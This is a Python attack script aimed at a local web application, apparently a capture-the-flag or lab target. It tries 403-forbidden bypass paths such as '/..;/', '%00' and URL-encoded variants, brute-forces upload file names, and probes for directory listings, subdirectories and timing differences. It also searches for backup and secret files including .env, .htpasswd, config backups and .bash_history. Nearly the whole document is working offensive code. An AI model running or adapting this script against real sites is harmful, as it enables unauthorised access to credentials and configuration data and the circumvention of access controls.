import requests
import re

base_url = "http://127.0.0.1:33209"
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Security Research)'
})

def attempt_direct_file_access():
    """Try to directly access files in uploads directory"""
    print("="*60)
    print("Direct File Access Attempts")
    print("="*60)
    
    # Try to guess uploaded file names based on common patterns
    test_files = [
        # Image files
        'image.jpg', 'image.png', 'image.gif', 'photo.jpg', 'photo.png',
        'picture.jpg', 'picture.png', 'avatar.jpg', 'avatar.png',
        
        # Document files
        'document.pdf', 'doc.pdf', 'file.pdf', 'upload.pdf',
        'document.txt', 'readme.txt', 'file.txt', 'notes.txt',
        
        # Backup files
        'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.bak',
        'data.zip', 'archive.zip', 'site.zip', 'www.zip',
        
        # Configuration files
        '.htaccess', '.htpasswd', 'config.php.bak', 'config.bak',
        'db.php', 'database.php', 'settings.php',
        
        # Common upload patterns
        'upload.jpg', 'upload.png', 'upload.pdf', 'upload.txt',
        'test.jpg', 'test.png', 'test.pdf', 'test.php',
        
        # Numbered files (common in upload systems)
        '1.jpg', '2.jpg', '3.jpg', '1.png', '2.png', '3.png',
        'file1.txt', 'file2.txt', 'file3.txt',
        
        # Flag patterns
        'flag.txt', 'flag.php', 'flag.png', 'flag.pdf',
        'secret.txt', 'secret.php', 'secret.png',
        '_flag.txt', '_flag.php', '.flag.txt', '.flag.php',
        
        # Specific to this app
        'upload-article.php.backup', 'upload-article.bak',
        'article1.txt', 'article2.txt', 'article3.txt',
        'post1.txt', 'post2.txt', 'post3.txt',
        
        # Log files
        'access.log', 'error.log', 'debug.log', 'app.log',
        '.bash_history', '.bash_logout', '.profile',
    ]
    
    found_files = []
    uploads_dir = '/posts/uploads/'
    
    for filename in test_files:
        url = f"{base_url}{uploads_dir}{filename}"
        try:
            response = session.get(url, timeout=3)
            if response.status_code == 200:
                print(f"[!] FOUND: {url} (Status: 200, Length: {len(response.content)}B)")
                found_files.append((filename, len(response.content), response.text[:200]))
            elif response.status_code != 404:
                print(f"[*] Interesting: {url} (Status: {response.status_code})")
        except Exception as e:
            print(f"[-] Error accessing {url}: {str(e)}")
    
    return found_files

def test_bypass_techniques():
    """Test various bypass techniques for 403 Forbidden"""
    print("\n" + "="*60)
    print("403 Bypass Techniques")
    print("="*60)
    
    base_dir = '/posts/uploads'
    
    bypass_attempts = [
        # Append various characters
        f"{base_dir}/",
        f"{base_dir}//",
        f"{base_dir}/.",
        f"{base_dir}/./",
        f"{base_dir}/..;/",
        f"{base_dir}/%20",
        f"{base_dir}/%09",  # tab
        f"{base_dir}/%00",
        
        # URL encoding variations
        f"/%70%6f%73%74%73/%75%70%6c%6f%61%64%73/",  # URL encoded /posts/uploads/
        
        # Case variations
        f"/{base_dir.upper()}/",
        
        # Different HTTP methods
        # These might reveal directory listing
    ]
    
    found_something = False
    
    for attempt in bypass_attempts:
        url = f"{base_url}{attempt}"
        try:
            print(f"\n[+] Testing: {attempt}")
            response = session.get(url, timeout=3)
            print(f"    Status: {response.status_code} | Length: {len(response.text)}B")
            
            if response.status_code == 200:
                print(f"[!] BYPASS SUCCESSFUL: {url}")
                print(f"[!] Content: {response.text[:300]}")
                found_something = True
            elif response.status_code != 403 and response.status_code != 404:
                print(f"[-] Unexpected status: {response.status_code}")
                
        except Exception as e:
            print(f"[-] Error: {str(e)}")
    
    return found_something

def enumerate_upload_directory():
    """Try to enumerate files using various techniques"""
    print("\n" + "="*60)
    print("Directory Enumeration via Timing")
    print("="*60)
    
    # Try to detect files based on response time (not always reliable but worth a shot)
    test_files = [
        'test.jpg', 'test.txt', 'test.php',
        'flag.txt', 'config.php', 'backup.zip'
    ]
    
    baseline_url = f"{base_url}/posts/uploads/nonexistentfile12345.txt"
    try:
        baseline_resp = session.get(baseline_url, timeout=3)
        baseline_time = baseline_resp.elapsed.total_seconds()
        print(f"Baseline response time (404): {baseline_time:.3f}s")
    except:
        baseline_time = 0.1
        print(f"Baseline failed, using default: {baseline_time:.3f}s")
    
    print("\n[+] Testing response times for potential files:")
    for filename in test_files:
        url = f"{base_url}/posts/uploads/{filename}"
        try:
            response = session.get(url, timeout=3)
            response_time = response.elapsed.total_seconds()
            status = response.status_code
            
            if status == 200:
                print(f"[!] FOUND: {filename} (Status: 200)")
            elif status == 403:
                # Check if response time differs from 404
                if abs(response_time - baseline_time) > 0.05:
                    print(f"[!] FILE EXISTS (403): {filename} (Time: {response_time:.3f}s)")
                else:
                    print(f"[-] Likely not found: {filename} (Time: {response_time:.3f}s)")
            elif status == 404:
                print(f"[-] Not found: {filename} (Time: {response_time:.3f}s)")
                
        except Exception as e:
            print(f"[-] Error testing {filename}: {str(e)}")

def check_posts_subdirectories():
    """Check for subdirectories under posts/"""
    print("\n" + "="*60)
    print("Checking Posts Subdirectories")
    print("="*60)
    
    subdirs = [
        '/posts/uploads/',
        '/posts/backup/',
        '/posts/old/',
        '/posts/drafts/',
        '/posts/private/',
        '/posts/tmp/',
        '/posts/temp/',
        '/posts/cache/',
        '/posts/logs/',
        '/posts/admin/',
        '/posts/.backup/',
        '/posts/.old/',
    ]
    
    results = {}
    
    for subdir in subdirs:
        url = f"{base_url}{subdir}"
        try:
            response = session.get(url, timeout=3)
            status = response.status_code
            
            print(f"{subdir:25s} - Status: {status}")
            
            if status == 200:
                print(f"[!] Found accessible directory: {subdir}")
                print(f"[!] Content preview: {response.text[:200]}")
                results[subdir] = {'status': status, 'content': response.text}
            elif status == 403:
                print(f"[*] Directory exists but forbidden: {subdir}")
                results[subdir] = {'status': status}
            else:
                results[subdir] = {'status': status}
                
        except Exception as e:
            print(f"[-] Error checking {subdir}: {str(e)}")
            results[subdir] = {'status': 'error', 'error': str(e)}
    
    return results

def check_posts_directory_listing():
    """Check if /posts/ has directory listing"""
    print("\n" + "="*60)
    print("Checking /posts/ Directory")
    print("="*60)
    
    posts_dirs = [
        '/posts/',
        '/posts',
    ]
    
    for posts_dir in posts_dirs:
        url = f"{base_url}{posts_dir}"
        try:
            response = session.get(url, timeout=5)
            status = response.status_code
            print(f"\n{posts_dir} - Status: {status}")
            
            if status == 200:
                print(f"[!] Directory listing enabled!")
                print(f"Full content:\n{response.text}")
                
                # Extract links to files
                links = re.findall(r'href=["\']([^"\']+)["\']', response.text, re.I)
                files = []
                for link in links:
                    if '.' in link and not link.startswith('http'):
                        files.append(link)
                
                if files:
                    print(f"\n[!] Files found: {files}")
                    return files
                    
            elif status == 403:
                print(f"[!] Directory exists but forbidden")
                print(f"Headers: {dict(response.headers)}")
            else:
                print(f"Response: {response.text[:200]}")
                
        except Exception as e:
            print(f"[-] Error: {str(e)}")
    
    return []

def check_for_backup_files():
    """Check for backup files in web root"""
    print("\n" + "="*60)
    print("Checking for Backup Files")
    print("="*60)
    
    backup_patterns = [
        # Common backup extensions
        '.bak', '.backup', '.old', '.orig', '.copy', '.tmp', '.temp',
        '.zip', '.tar.gz', '.tar', '.gz', '.7z', '.rar',
        '.swp', '.swo', '~', '.~',
        
        # For PHP files
        'index.php.bak', 'index.php.old', 'index.php.backup',
        'post.php.bak', 'post.php.old', 'post.php.backup',
        'config.php.bak', 'config.php.old', 'config.php.backup',
        'upload-article.php.bak', 'upload-article.php.backup',
        
        # Common config files
        '.env', '.env.bak', '.env.backup',
        'wp-config.php.bak', 'config.php~', '.htaccess.bak',
        
        # Directory backups
        'backup.zip', 'site.zip', 'www.zip', 'web.zip',
        'public_html.zip', 'html.zip', 'backup.tar.gz',
    ]
    
    found_backups = []
    
    for filename in backup_patterns:
        url = f"{base_url}/{filename}"
        try:
            response = session.get(url, timeout=3)
            if response.status_code == 200:
                print(f"[!] BACKUP FOUND: {filename} (Size: {len(response.content)}B)")
                found_backups.append(filename)
                
                # Print content for text files
                if filename.endswith(('.txt', '.php', '.bak', '.env', '.htaccess')):
                    print(f"Content preview: {response.text[:300]}")
                    
                # Check if it's a binary that might be a backup
                elif len(response.content) > 100:
                    print(f"[!] Large backup file found: {filename}")
                    
        except Exception as e:
            print(f"[-] Error checking {filename}: {str(e)}")
    
    return found_backups

# Main execution
print("="*60)
print("Upload Directory Enumeration & 403 Bypass")
print("="*60)

# 1. Test bypass techniques
print("\n[PHASE 1] Testing 403 bypass techniques...")
bypass_results = test_bypass_techniques()

# 2. Check posts/ directory listing
print("\n[PHASE 2] Checking /posts/ directory...")
posts_files = check_posts_directory_listing()

# 3. Check subdirectories
print("\n[PHASE 3] Checking subdirectories under /posts/")
subdir_results = check_posts_subdirectories()

# 4. Try enumerating specific files
print("\n[PHASE 4] Enumerating specific files in uploads/")
found_files = attempt_direct_file_access()

# 5. Check for backup files in web root
print("\n[PHASE 5] Checking for backup files")
backup_files = check_for_backup_files()

# 6. Timing-based enumeration
print("\n[PHASE 6] Timing-based file detection")
enumerate_upload_directory()

# Generate final report
print("\n" + "="*60)
print("FINAL REPORT")
print("="*60)

print("\n[ Results Summary ]")
print(f"403 Bypass successful: {bypass_results}")
print(f"Files found in /posts/: {posts_files}")
